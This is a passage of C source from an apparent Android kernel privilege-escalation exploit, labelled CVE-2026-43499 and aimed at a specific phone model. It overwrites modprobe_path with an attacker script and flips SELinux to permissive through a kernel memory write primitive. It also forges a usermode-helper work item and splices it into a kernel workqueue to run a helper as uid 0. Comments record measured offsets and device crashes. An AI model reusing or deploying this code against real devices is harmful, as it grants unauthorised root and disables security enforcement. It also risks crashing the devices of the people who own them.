  const char *se_env = getenv("ROOT_MP_SELINUX_OFF");
  uintptr_t se_addr =
      (se_env && se_env[0] == '0' && (se_env[1] == 'x' || se_env[1] == 'X'))
          ? (uintptr_t)strtoull(se_env + 2, NULL, 16)
          : 0;
  if (!se_addr) {
    rmg_diag("ROOT mp selinux flip DISABLED (selinux_state.enforcing is behind "
             "RANDSTRUCT; set ROOT_MP_SELINUX_OFF=<hex offset> to enable)\n");
  } else {
    unsigned char se_read = 0xff;
    unsigned char se_rb = 0xff;
    /* ROOT_MP_SELINUX_OFF carries a raw kernel-IMAGE FILE OFFSET (the same form as
   SELINUX_ENFORCING_OFF, e.g. 0x2d8e5c0), NOT a full address. text_addr() is defined as
   kaslr_base + (x - KIMAGE_TEXT_BASE), so it must be handed KIMAGE_TEXT_BASE + off.
   Passing the bare offset to text_addr() computed
   kaslr_base + (0x2d8e5c0 - 0xffffffc008000000), which wraps to a nonsense address, and the
   run died there with "RD target=0000000002ede5bf ... len=2" - a plain integer, not a
   kernel virtual address, which is exactly what that underflow produces. Note the other
   call sites already do this correctly: install_workqueue_umh_root() and the PTY stage both
   pass text_addr(SELINUX_ENFORCING), and SELINUX_ENFORCING is itself defined as
   KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF. Only the env-var path was missing the base. */
  if (root_mp_read_byte(fd, text_addr(KIMAGE_TEXT_BASE + se_addr), &se_read, "selinux")) {
      if (se_read != 1) {
        rmg_diag("ROOT mp selinux byte at %016zx is %u, not 1; not touching it\n",
                 (unsigned long)se_addr, (unsigned)se_read);
      } else {
        se_original = (char)se_read;
        /* Arm the rollback BEFORE the write. root_mp_write() only proves pwrite()
         * returned len; a write that lands and is then unobservable (a rejected
         * readback plan, a short pread, EINTR) is indistinguishable from one that
         * did not land, so the restore must be armed on the strength of the write
         * alone. Leaving it unarmed in that case is how a "NOT observed" line ends
         * with the flag left permissive and nothing to undo it. */
        g_se_restore_fd = fd;
        g_se_restore_addr = text_addr(KIMAGE_TEXT_BASE + se_addr);
        g_se_restore_value = se_original;
        atexit(root_mp_selinux_atexit);
        se_changed = 1;
        if (root_mp_write(fd, text_addr(KIMAGE_TEXT_BASE + se_addr), &se_zero, 1, "selinux")) {
          if (root_mp_read_byte(fd, text_addr(KIMAGE_TEXT_BASE + se_addr), &se_rb, "selinuxrb") &&
              se_rb == 0) {
            rmg_diag("ROOT mp selinux set permissive at %016zx (old=1)\n",
                     (unsigned long)se_addr);
          } else {
            /* Ambiguous, not disproven. Restore is still armed and still runs. */
            rmg_diag("ROOT mp selinux permissive write at %016zx NOT confirmed "
                     "(readback=%u); restore remains armed\n",
                     (unsigned long)se_addr, (unsigned)se_rb);
          }
        } else {
          rmg_diag("ROOT mp selinux write reported failure at %016zx; restore "
                   "remains armed\n",
                   (unsigned long)se_addr);
        }
      }
    } else {
      rmg_diag("ROOT mp selinux byte at %016zx could not be read; not touching "
               "it\n",
               (unsigned long)se_addr);
    }
  }

  trigger = fork();
  if (trigger == 0) {
    root_mp_fire_triggers();
    _exit(0);
  }
  if (trigger < 0) {
    /* No child means no request_module() will ever be issued from this process,
     * so waiting is guaranteed futile. Bail out now - but through `restore_out`,
     * because modprobe_path is planted at this point and must come back. */
    rmg_diag("ROOT mp trigger FORK FAILED errno=%d; no trigger will fire\n",
             errno);
    goto restore_out;
  }
  rmg_diag("ROOT mp trigger child=%d\n", (int)trigger);

  /* Two waits, not one. The marker is written by the UMH script the instant the
   * kernel execs it, so it measures "a trigger fired and modprobe_path was live".
   * The creds file is written by the helper's su_daemon after it has installed
   * root and is deliberately allowed to take seconds. A single combined window
   * conflated those two very different events: a slow-but-succeeding UMH was
   * indistinguishable from no trigger at all, which is exactly the signal needed
   * to tell a broken trigger battery from a broken helper. Each stage reports its
   * own outcome and how long it actually took.
   *
   * Units: the env knobs are SECONDS and the loops below count MILLISECONDS. The
   * conversion happens once, here, at the boundary. Keeping it inline in the loop
   * bounds previously compared seconds against a millisecond counter, which ended
   * every wait after a single iteration - a ~350 ms total window on a route whose
   * own comment says the creds file takes seconds. */
  /* Clock-derived deadlines, not `waited` accumulators. Accumulating a step per
   * iteration silently under-counts whenever a read or a usleep overruns the step
   * it is standing in for, which shortens the window without saying so. */
  int marker_wait_ms = root_mp_env_seconds("ROOT_MP_MARKER_WAIT_SEC", 20) * 1000;
  int creds_wait_ms = root_mp_env_seconds("ROOT_MP_CREDS_WAIT_SEC", 120) * 1000;
  int marker_seen = 0;
  unsigned long t0 = root_mp_now_ms();
  unsigned long deadline0 = t0 + (unsigned long)marker_wait_ms;
  while (root_mp_now_ms() < deadline0 && !marker_seen) {
    if (access(ROOT_MP_MARKER, F_OK) == 0) {
      marker_seen = 1;
    } else {
      usleep(100000);
    }
  }
  rmg_diag("ROOT mp marker %s after %lums (window %dms)\n",
           marker_seen ? "APPEARED" : "NEVER APPEARED",
           root_mp_now_ms() - t0, marker_wait_ms);

  int creds_seen = 0;
  unsigned long t1 = root_mp_now_ms();
  unsigned long deadline1 = t1 + (unsigned long)creds_wait_ms;
  while (root_mp_now_ms() < deadline1 && !creds_seen) {
    if (access(ROOT_MP_MARKER, F_OK) == 0 && root_mp_creds_root()) {
      creds_seen = 1;
    } else {
      usleep(250000);
    }
  }
  rmg_diag("ROOT mp creds %s after %lums (window %dms)\n",
           creds_seen ? "VERIFIED uid=0" : "NEVER VERIFIED",
           root_mp_now_ms() - t1, creds_wait_ms);
  hit = marker_seen && creds_seen;
  root_mp_report_files(hit ? "AFTER-HIT" : "AFTER-MISS");
  if (marker_seen && !creds_seen) {
    /* The decisive split, and it is worth naming in the log rather than leaving
     * it to be inferred: the UMH script ran, so request_module() fired and
     * modprobe_path was live and executable, and whatever failed is the helper.
     * Conversely marker NEVER APPEAREd means no trigger reached modprobe_path at
     * all - a trigger-coverage or SELinux problem, not a helper problem. */
    rmg_diag("ROOT mp SPLIT: script ran but creds never appeared => the helper "
             "is the failing stage, not the trigger\n");
  } else if (!marker_seen) {
    rmg_diag("ROOT mp SPLIT: script never ran => no request_module() reached "
             "modprobe_path (trigger coverage or exec denial)\n");
  }

restore_out:
  /* Roll back with the SAME addressing that won the write. If the low rewrite is
   * what landed, a plain 24-byte write at addr would put the path back one byte
   * off and leave modprobe_path holding garbage for the rest of the boot.
   *
   * EVERY path that can have planted the path lands here, and the result is
   * VERIFIED, not merely attempted: configfs_write_once() picks its page from a
   * plan validated by simulation rather than readback (util.c:3277-3343), so a
   * rollback write can report ok=1 while landing on a fresh page and leaving the
   * planted path in place. Unverified rollbacks are how modprobe_path survives a
   * failed attempt with only a "rolling back" line to show for it. */
  if (wrote_path) {
    if (low_by_one) {
      char back[ROOT_MP_LEN + 1];
      back[0] = original[0];
      memcpy(back + 1, original, ROOT_MP_LEN);
      restored = root_mp_write(fd, linear_addr - 1, back, sizeof(back),
                               "restore-low");
    } else {
      restored = root_mp_write(fd, linear_addr, original, sizeof(original),
                               "restore");
    }
    if (!restored) {
      rmg_diag("ROOT mp restore write reported FAILURE - modprobe_path may be "
               "left modified\n");
    } else {
      /* Zeroed first: root_mp_read24() only writes `readback` on success, so a
       * failed read would otherwise log the PRE-restore contents - the planted
       * path - on the one line whose entire job is to report what modprobe_path
       * holds after the restore. */
      memset(readback, 0, sizeof(readback));
      if (root_mp_read24(fd, image_addr, readback, "restoreread") &&
          memcmp(readback, original, ROOT_MP_LEN) == 0) {
        restore_ok = 1;
        rmg_diag("ROOT mp restore verified=[%.24s]\n", readback);
      } else {
        rmg_diag("ROOT mp restore readback MISMATCH hex=%s - modprobe_path is "
                 "NOT back to its original bytes\n",
                 root_mp_hex(readback, ROOT_MP_LEN));
      }
    }
  }

  if (se_changed) {
    /* Cleared regardless of the outcome, and only AFTER the restore attempt: the
     * atexit handler is a net for a normal exit() from anywhere else in the
     * process, so it must stay armed exactly as long as the flag may still be
     * permissive. (Signal and hard-crash paths do not run atexit handlers by
     * design; those are cleared by the reboot, and the state is boot-scoped.) */
    int se_restored = root_mp_write(fd, g_se_restore_addr, &se_original, 1,
                                    "selinux-restore");
    g_se_restore_fd = -1;
    rmg_diag("ROOT mp selinux restore to %u ok=%d\n",
             (unsigned char)se_original, se_restored);
  }

  if (trigger > 0) {
    kill(trigger, SIGKILL);
    /* The trigger child can be sitting inside a blocking request_module(); a
     * single WNOHANG right after SIGKILL often still returns 0 and leaves a
     * zombie, so reap with a short bounded blocking loop. */
    for (int i = 0; i < 50; i++) {
      pid_t got = waitpid(trigger, NULL, WNOHANG);
      if (got == trigger || (got < 0 && errno == ECHILD)) {
        break;
      }
      usleep(20000);
    }
  }

  /* Publish the same globals the legacy stage publishes. main.c computes
   * `exploit_ok = cfi_stage_done && root_child_done`, so returning 1 from
   * install_child_root() without setting root_child_done here would make a fully
   * successful modprobe root report itself as a FAILURE and skip the allocation
   * keeper. Same fail-closed rule as install_android_root(): only publish a
   * measured uid==0. */
  if (hit) {
    uint32_t measured_uid = 0xffffffff;
    if (read_root_creds_uid(&measured_uid) && measured_uid == 0) {
      root_child_done = 1;
      root_uid_after = measured_uid;
      rmg_diag("ROOT mp publication uid_after=%u (measured)\n", measured_uid);
    } else {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      rmg_diag("ROOT mp creds unverified measured_uid=%u; not publishing root\n",
               measured_uid);
      hit = 0;
    }
  }
  /* One line that states the state of modprobe_path, not just whether root was
   * obtained. `hit` is deliberately NOT conditioned on the restore: root is root,
   * and a failed rollback leaves modprobe_path pointing at our own script, which
   * is not a hazard to the device. What matters is that a reader of the log can
   * see it rather than having to correlate a "restore ... MISMATCH" line dozens of
   * lines above with a bare hit=1. */
  rmg_diag("ROOT mp result hit=%d root_child_done=%d wrote_path=%d low_by_one=%d "
           "restored=%d restore_ok=%d\n",
           hit, root_child_done, wrote_path, low_by_one, restored, restore_ok);
  if (wrote_path && !restore_ok) {
    rmg_diag("ROOT mp WARNING modprobe_path is NOT in its original state; every "
             "request_module() on this device will exec %s until reboot\n",
             ROOT_MP_SCRIPT);
  }
  return hit;
}

/* ---- .data scratch placement for the UMH stages -----------------------------
 *
 * configfs_write_once() - the only writer proven to land on this firmware
 * ("WR pwrite ret=24 errno=0" against modprobe_path every run) - reaches
 * kernel .data only: the raw Image window
 * [KIMAGE_TEXT_BASE + 0x2a30000, KIMAGE_TEXT_BASE + 0x2f50000), the same
 * window the mp alias lives in. A SLAB target makes it return 0 silently
 * (the measured "ROOT umh data_write=0 / work_write=0" with every read in
 * the same function succeeding), so the UMH scratch cannot stay in the
 * reclaimed ashmem page. These helpers place it in .data instead:
 *
 *   - the whole ROOT_UMH_DATA_OFF + sizeof(umh_kernel_data) footprint must
 *     already read back as zero, so the placement cannot land on a live
 *     kernel object (a zero object is inert: nothing follows a pointer
 *     into it, nothing counts it, and the restore writes the same zeros
 *     back);
 *   - the placement is decided BEFORE any pointer into the scratch is
 *     derived, so every field that names the scratch (completion, path,
 *     argv, envp and the completion's self-pointing wait_list) is computed
 *     from the final address - the relocate-after-build bug, where forged
 *     pointers kept naming the abandoned SLAB page, cannot recur;
 *   - ROOT_DATA_SCRATCH=s surveys every candidate read-only and reports;
 *     ROOT_DATA_SCRATCH=<rel> forces one span after the same zero check;
 *     unset means auto-survey and refuse the stage when nothing is clean
 *     (the SLAB fallback is a proven dead end, not a slower path).
 */
#define UMH_DATA_WIN_LO 0x2a30000ULL
#define UMH_DATA_WIN_HI 0x2f50000ULL
#define UMH_DATA_SCRATCH_SPAN \
  (ROOT_UMH_DATA_OFF + \
   (uintptr_t)(UMH_CASCADE_STUBS * sizeof(struct umh_cascade_data)))

/* The configfs AAR proves reads up to 224 bytes; the .data scans and
 * sweeps below all use that width. */
#define UMH_STATIC_SCAN_CHUNK 224
#define UMH_STATIC_SCAN_STEP (UMH_STATIC_SCAN_CHUNK - 48)
#define UMH_STATIC_MAX_CANDS 8
#define UMH_STATIC_MAX_SOFT 3

static const uintptr_t umh_data_scratch_cands[] = {
    0x2f48000ULL, 0x2f40000ULL, 0x2f30000ULL,
    0x2f20000ULL, 0x2f10000ULL, 0x2d00000ULL,
};

/* A scratch address is valid for these stages when it names the kernel image
 * .data window - the one region both configfs primitives are proven to reach -
 * or, for the raw-VA readers, the direct map. */
static int umh_scratch_ptr_ok(uintptr_t addr) {
  if (is_direct_ptr(addr)) {
    return 1;
  }
  const uintptr_t lo = text_addr(KIMAGE_TEXT_BASE + UMH_DATA_WIN_LO);
  const uintptr_t hi = text_addr(KIMAGE_TEXT_BASE + UMH_DATA_WIN_HI);
  return addr >= lo && addr < hi;
}

static int umh_data_scratch_is_clean(int fd, uintptr_t rel) {
  if (rel < UMH_DATA_WIN_LO ||
      rel + UMH_DATA_SCRATCH_SPAN > UMH_DATA_WIN_HI) {
    return 0;
  }
  const uintptr_t base = text_addr(KIMAGE_TEXT_BASE + rel);
  const uintptr_t end = base + UMH_DATA_SCRATCH_SPAN;
  if (!umh_scratch_ptr_ok(base) || !umh_scratch_ptr_ok(end - 1)) {
    return 0;
  }
  /* The AAR proves reads up to 224 bytes, so the zero sweep reads in
   * 224-byte chunks instead of one 8-byte word at a time. */
  for (uintptr_t a = base; a < end; a += UMH_STATIC_SCAN_CHUNK) {
    uint64_t buf[UMH_STATIC_SCAN_CHUNK / 8] = {0};
    size_t want =
        (end - a < UMH_STATIC_SCAN_CHUNK) ? (size_t)(end - a)
                                          : UMH_STATIC_SCAN_CHUNK;
    if (!root_read_global(fd, a, buf, want)) {
      return 0;
    }
    for (size_t i = 0; i < want / sizeof(uint64_t); i++) {
      if (buf[i] != 0) {
        return 0;
      }
    }
  }
  return 1;
}

static uintptr_t umh_data_scratch_survey(int fd, int report_all) {
  uintptr_t first = 0;
  for (size_t i = 0;
       i < sizeof(umh_data_scratch_cands) / sizeof(umh_data_scratch_cands[0]);
       i++) {
    const uintptr_t rel = umh_data_scratch_cands[i];
    int clean = umh_data_scratch_is_clean(fd, rel);
    if (report_all) {
      rmg_diag("ROOT umh scratch survey rel=%#zx clean=%d\n", rel, clean);
    }
    if (clean && !first) {
      first = rel;
    }
  }
  return first;
}

/* Returns the chosen .data RELATIVE offset, or 0 to abort the stage. */
static uintptr_t umh_data_scratch_place(int fd) {
  const char *ds = getenv("ROOT_DATA_SCRATCH");
  if (ds && ds[0] == 's') {
    umh_data_scratch_survey(fd, 1);
    return 0;
  }
  if (ds && ds[0]) {
    uintptr_t rel = (uintptr_t)strtoull(ds, NULL, 0);
    if (!umh_data_scratch_is_clean(fd, rel)) {
      /* Non-fatal on purpose: this helper is shared with the static-work stage
       * (root.c install_static_work_umh_root), and pr_error() exits the whole
       * process, which would kill the stage fallback instead of letting it
       * return 0 and try the next route. */
      rmg_diag("ROOT umh .data scratch rel=%#zx is not clean; refusing\n", rel);
      pr_warning("root umh .data scratch rel=%#zx is not clean; refusing\n", rel);
      return 0;
    }
    return rel;
  }
  uintptr_t rel = umh_data_scratch_survey(fd, 0);
  if (!rel) {
    rmg_diag("ROOT umh no clean .data scratch span (configfs writes only "
             "reach .data, so the SLAB scratch is not an option)\n");
  }
  return rel;
}

/* Zero the planted umh_data span so the NEXT attempt's cleanliness survey
 * passes. The plant writes sizeof(struct umh_kernel_data) (360) bytes at
 * scratch+ROOT_UMH_DATA_OFF, and the candidate restore only returns the
 * candidate's func and tail - this span was never cleaned, so run17 died
 * with "no clean .data scratch span" on every attempt after the first
 * (enter=12 noclean=16). Only call when no helper is mid-flight: the
 * completion has fired (kernel_execve already consumed path/argv/envp) or
 * nothing was ever queued (span merely planted, nobody reads it). */
static void staticwork_scratch_zero(int fd, uintptr_t umh_data_addr) {
  uint8_t zeros[sizeof(struct umh_kernel_data)];
  memset(zeros, 0, sizeof(zeros));
  if (root_write_data(fd, umh_data_addr, zeros, sizeof(zeros))) {
    rmg_diag("ROOT staticwork scratch zeroed at %016zx\n",
             (uintptr_t)umh_data_addr);
  } else {
    rmg_diag("ROOT staticwork scratch zero FAILED at %016zx\n",
             (uintptr_t)umh_data_addr);
  }
}

static int install_workqueue_umh_root(int fd) {
  /* The splice at the end of this stage writes pool->worklist, which lives in
   * SLAB. configfs_write_once() reaches only .data and PANICS on a SLAB target
   * (measured 2026-10-03 on RFCWC0G1Z1J: the stage read the worklist at
   * ffffff80011d9a30 fine, then rebooted the device writing worklist->prev at
   * ffffff80011d9a38 - the log stops with no "WR pwrite ret=" line). So the
   * splice is only safe when the pipe physrw writer is installed. Without it,
   * abort BEFORE any write and let the static-work stage (which needs no SLAB
   * write at all) take over. */
  if (!physrw_write_ok || !physrw_write64_ok) {
    rmg_diag("ROOT umh workqueue no physrw write_ok=%d write64_ok=%d; "
             "aborting before the SLAB worklist splice\n",
             physrw_write_ok, physrw_write64_ok);
    pr_warning("root umh workqueue stage needs physrw (write_ok=%d write64_ok=%d); "
             "aborting before the SLAB worklist splice\n",
             physrw_write_ok, physrw_write64_ok);
    return 0;
  }
  /* text_addr(), not data_addr(). Both SELINUX_ENFORCING (0x2d8e5c0) and
   * SYSTEM_UNBOUND_WQ (0x02a90800) sit in .data, which IS the region this AAR can reach
   * ([kaslr_base+0x2a30000, kaslr_base+0x2f50000), measured). data_addr() falls back to
   * data_direct_addr() - the linear-map alias - whenever data_addr_canonical is 0, and the
   * historical failure of this stage was exactly that: "ROOT legacy ... RD
   * target=ffffff805f7f3f00 / ffffff805f7f2400" are PAGE_OFFSET-prefixed addresses, i.e. the
   * direct map, which is measured fatal. text_addr() only needs kaslr_done and yields the
   * slid kimage address inside .data, which is proven to work (modprobe_path is planted
   * there every run). This stage is the UPSTREAM ROOT PATH - BuSung-dev/CVE-2026-43499-S25U
   * lists "Added the device-specific system_unbound_wq user-mode-helper root path", and
   * IonStack's verified output is "pipe physrw ... uid=2000->0" via this route, NOT a cred
   * patch - so it must not stay disabled on the strength of a linear-map fault. */
  uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uint8_t selinux_old = 0;
  uint8_t selinux_readback = 0;
  /* The scratch must live in kernel .data: configfs_write_once() - the only
   * writer proven on this firmware - cannot reach SLAB, and the reclaimed
   * ashmem page is SLAB. Place it before any pointer into it is derived, so
   * the completion/path/argv/envp fields below are computed from the final
   * address. ROOT_DATA_SCRATCH=s surveys read-only; =<rel> forces a span;
   * unset auto-surveys and refuses the stage when nothing is clean. */
  uintptr_t data_scratch_rel = umh_data_scratch_place(fd);
  if (!data_scratch_rel) {
    return 0;
  }
  uintptr_t scratch_va = text_addr(KIMAGE_TEXT_BASE + data_scratch_rel);
  uintptr_t fake_work_addr = scratch_va + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = scratch_va + ROOT_UMH_DATA_OFF;
  uint8_t saved_work[sizeof(struct umh_subprocess_info)];
  uint8_t saved_data[sizeof(struct umh_kernel_data)];
  uint8_t scratch_readback[sizeof(struct umh_kernel_data)];
  int scratch_saved = 0;
  int selinux_changed = 0;
  
  int list_prev_changed = 0;
  int published = 0;
  uint32_t complete_done = 0;
  int socket_ok = 0;
  int result = 0;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif
  rmg_diag("ROOT umh start helper=%s work=%016zx data=%016zx\n", root_umh_path,
           (uintptr_t)fake_work_addr, (uintptr_t)umh_data_addr);
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_error("root umh helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  uintptr_t fake_work_end = fake_work_addr + sizeof(saved_work) - 1;
  uintptr_t umh_data_end = umh_data_addr + sizeof(saved_data) - 1;
  if (!umh_scratch_ptr_ok(fake_work_addr) || !umh_scratch_ptr_ok(umh_data_addr) ||
      fake_work_end < fake_work_addr || umh_data_end < umh_data_addr ||
      (fake_work_addr >> PAGE_SHIFT) != (fake_work_end >> PAGE_SHIFT) ||
      (umh_data_addr >> PAGE_SHIFT) != (umh_data_end >> PAGE_SHIFT) ||
      !(fake_work_end < umh_data_addr || umh_data_end < fake_work_addr)) {
    pr_error("root umh bad scratch spans work=%016zx-%016zx data=%016zx-%016zx\n",
             fake_work_addr, fake_work_end, umh_data_addr, umh_data_end);
    return 0;
  }
rmg_diag("ROOT umh reading scratch work(%zu) data(%zu)\n", sizeof(saved_work),
           sizeof(saved_data));
    /* ROOT_UMH_TRUST_SCRATCH=1 skips the pre-write readback of the borrowed
     * work_struct.
     *
     * Measured on RFCWC0G1Z1J: this read HANGS. fake_work_addr is a real kernel
     * object in the data window -
     *     ROOT umh start helper=... work=ffffff880c2d6000 data=ffffff880c2d6200
     *     ROOT umh reading scratch work(112) data(360)
     * and then nothing, for 15+ minutes with the process alive. The same physrw
     * read primitive succeeds against our own reclaim page (p0 diagnostic
     * target-before addr=ffffff89262d8858 returns) and against the kernel image
     * window (configfs_read_once of misc_fops=ffffffc00acdcf28), so the hang is
     * specific to static kernel objects, not to physrw in general. Reading
     * kmem_cache at ffffffff80011d2798 hung the same way earlier.
     *
     * A hang cannot be caught, so the only remedy is not to issue the read. What it
     * buys us is (a) a zero precondition on memory we are about to overwrite
     * anyway, and (b) a best-effort restore later, gated on scratch_saved. Neither
     * is required to get the forged work queued - that is what actually produces
     * root - so skipping loses only the tidy-up. Default behaviour is UNCHANGED
     * when the variable is unset. */
    const int trust_scratch = getenv("ROOT_UMH_TRUST_SCRATCH") != NULL;
    if (trust_scratch) {
      rmg_diag("ROOT umh skipping scratch readback (ROOT_UMH_TRUST_SCRATCH=1); "
               "no restore will be attempted\n");
      scratch_saved = 0;
    } else if (!root_read_data(fd, fake_work_addr, saved_work, sizeof(saved_work)) ||
               !root_read_data(fd, umh_data_addr, saved_data, sizeof(saved_data))) {
      pr_error("root umh scratch old read failed\n");
      rmg_diag("ROOT umh scratch read FAILED\n");
      return 0;
    } else {
    scratch_saved = 1;
    if (!root_all_zero(saved_work, sizeof(saved_work)) ||
        !root_all_zero(saved_data, sizeof(saved_data))) {
      pr_error("root umh scratch not zero work=%d data=%d\n",
               root_all_zero(saved_work, sizeof(saved_work)),
               root_all_zero(saved_data, sizeof(saved_data)));
      return 0;
    }
  }
  int selinux_read = root_read_global(
      fd, selinux_addr, &selinux_old, sizeof(selinux_old));
  if (!selinux_read) {
    pr_error("root umh selinux read failed direct=%016zx virtual=%016zx\n",
             selinux_addr, text_addr(SELINUX_ENFORCING));
    return 0;
  }
  if (selinux_old > 1) {
    pr_error("root umh bad selinux old=%u\n", selinux_old);
    return 0;
  }
  pr_info("root umh spans work=%016zx-%016zx data=%016zx-%016zx selinux=%016zx old=%u\n",
          fake_work_addr, fake_work_end, umh_data_addr, umh_data_end,
          selinux_addr, selinux_old);

  unlink(ROOT_SOCKET_PATH);

  /* Same reasoning as selinux_addr above: this is a .data global, so use the slid kimage
   * address that this AAR can actually read, never the linear-map alias. */
  uintptr_t wq_slot = text_addr(SYSTEM_UNBOUND_WQ);
  uint64_t wq_value = 0;
  rmg_diag("ROOT umh scratch ok, reading wq slot=%016zx\n", wq_slot);
  if (!root_read_global(fd, wq_slot, &wq_value, sizeof(wq_value))) {
    pr_error("root umh workqueue slot read failed\n");
    rmg_diag("ROOT umh wq slot read FAILED\n");
    goto cleanup;
  }
  rmg_diag("ROOT umh wq=%016llx\n", (unsigned long long)wq_value);
  uintptr_t wq = (uintptr_t)wq_value;

  /* ==== THE CORRECT CHAIN: wq -> wq->pools -> worker_pool -> pool->worklist ====
   *
   * The previous route read wq->dfl_pwq (+0xb0). MEASURED over five boots (MEMORY section 16),
   * that field holds ffffff805f7f3xxx - the PERCPU pool_workqueue - and percpu is outside every
   * window this exploit has, so the read faults no matter which reader or alias is used. That
   * single field caused every "RD target=ffffff805f7f2xxx/3xxx" fatal in this session.
   *
   * wq->pools at +0x10 is the list of boot-allocated worker_pool objects, which live in the SLAB
   * arena 0xffffff80011d.... - readable, as wq itself proves every run (slab at ffffff80011d8200 /
   * a200 / be00, read fine each time). The pool dump showed pool+0x20 = worklist with
   * next == prev, i.e. EMPTY, which is exactly the insertion precondition this route needs.
   */
  if (!is_direct_ptr(wq)) {
    pr_error("root umh bad wq wq_slot=%016zx wq=%016zx\n", wq_slot, wq);
    return 0;
  }
  uint64_t pools_next = 0;
  uint64_t pools_prev = 0;
  if (!umh_read64(fd, wq + WQ_POOLS_OFF, &pools_next, "wq.pools.next") ||
      !umh_read64(fd, wq + WQ_POOLS_OFF + sizeof(uint64_t), &pools_prev,
                  "wq.pools.prev")) {
    pr_error("root umh wq->pools read failed wq=%016zx\n", wq);
    goto cleanup;
  }
  rmg_diag("ROOT umh wq=%016zx pools=%016llx/%016llx\n", wq,
           (unsigned long long)pools_next, (unsigned long long)pools_prev);
  if (pools_next == pools_prev) {
    rmg_diag("ROOT umh pools list self-referential (single pool)\n");
  }
  /* POOL_LIST_OFF is 0 here (measured), so pool->list sits at the pool base. */
  uintptr_t pool = (uintptr_t)pools_next - POOL_LIST_OFF;
  if (!is_direct_ptr(pool)) {
    pr_error("root umh bad pool from wq->pools wq=%016zx next=%016llx pool=%016zx\n", wq,
             (unsigned long long)pools_next, pool);
    return 0;
  }

  /* The ROOT_WQ_DUMP diagnostic below can still dump the live wq struct for re-measurement.
   *
   * Measured: wq itself is SLAB (0xffffff80011d8200 / 0xffffff80011da200 / 0xffffff80011dbe00
   * across three boots) and is READABLE every time, while wq->dfl_pwq is 0xffffff805f7f3d00 -
   * the percpu area - and faults on every read. That is structural, not a bad offset: for an
   * unbound workqueue dfl_pwq is the percpu pool_workqueue, and percpu is outside every window
   * this exploit has, which is why the chase above uses wq->pools instead. */
  if (getenv("ROOT_WQ_DUMP")) {
    /* One child reads the whole window, so the words are logged as a single atomic line by the
     * child's own diag and a fault anywhere aborts the child without losing the words it had
     * already emitted. Walking with one child per word instead produced nothing at all: the
     * first fault took the machine down before the parent's post-read diag could run. */
    if (fork() == 0) {
      for (int off = 0; off < 0x100; off += 8) {
        uint64_t w = 0;
        if (umh_read64(fd, wq + (uintptr_t)off, &w, "wq.dump")) {
          rmg_diag("ROOT wqdump +0x%02x = %016llx\n", off, (unsigned long long)w);
        } else {
          rmg_diag("ROOT wqdump +0x%02x FAILED\n", off);
          _exit(0);
        }
      }
      _exit(0);
    }
int dump_status = 0;
    waitpid(-1, &dump_status, 0);
  }

  /* `pool` and `wq` come from the wq->pools chase above, which is fully readable.
   POOL_WORKLIST_OFF 0x20 is MEASURED on this firmware: the live pool returned
   worklist.next == worklist.prev == ffffff80011da630, i.e. the unbound pool's worklist is empty
   and available to link into. */
/* Write the pool base's FIRST word back, then verify from the PARENT (not a child).
   *
   * Prior runs wrote from inside a forked child and logged the result from that same child, so
   * "no write_ok line" was ambiguous: it could have meant the write never returned, or that the
   * child died before it could log. This version has the PARENT log "issued" before the call and
   * "returned" after it, in the parent's own durable log, so the two outcomes are
   * distinguishable. If the write returns AND the readback matches, slab writes work and my
   * earlier conclusion was wrong. */
  if (getenv("ROOT_SLAB_W3")) {
    uintptr_t t0 = pool;
    uint64_t v0 = 0;
    if (!umh_read64(fd, t0, &v0, "w3.read")) {
      rmg_diag("ROOT slabw3 pool=%016zx READ FAILED\n", t0);
      return 0;
    }
    rmg_diag("ROOT slabw3 pool=%016zx val=%016llx ISSUING write from parent\n", t0,
             (unsigned long long)v0);
    errno = 0;
    int ok = root_write64(fd, t0, v0);
    rmg_diag("ROOT slabw3 pool=%016zx write RETURNED ok=%d errno=%d\n", t0, ok, errno);
    uint64_t back = 0;
    if (umh_read64(fd, t0, &back, "w3.verify")) {
      rmg_diag("ROOT slabw3 pool=%016zx readback=%016llx MATCH=%d -> SLAB WRITES %s\n",
               t0, (unsigned long long)back, back == v0,
               back == v0 ? "WORK" : "CORRUPT");
    } else {
      rmg_diag("ROOT slabw3 pool=%016zx readback FAILED\n", t0);
    }
    rmg_diag("ROOT slabw3 done\n");
    return 0;
  }

  /* Targeted slab-write probe: test the worker_pool header itself, and the worklist head, each
     with a write of the value just READ (so state is unchanged either way), in a forked child
     with the parent logging first. */
  if (getenv("ROOT_SLAB_W2")) {
    static const uintptr_t probes[] = {
        0xffffff80011d9010ULL, /* pool base (from wq->pools.next) */
        0xffffff80011d9030ULL, /* pool+0x20 worklist.next */
        0xffffff80011d9c00ULL, /* pool+0x20 + 0x2000, same slab page */
    };
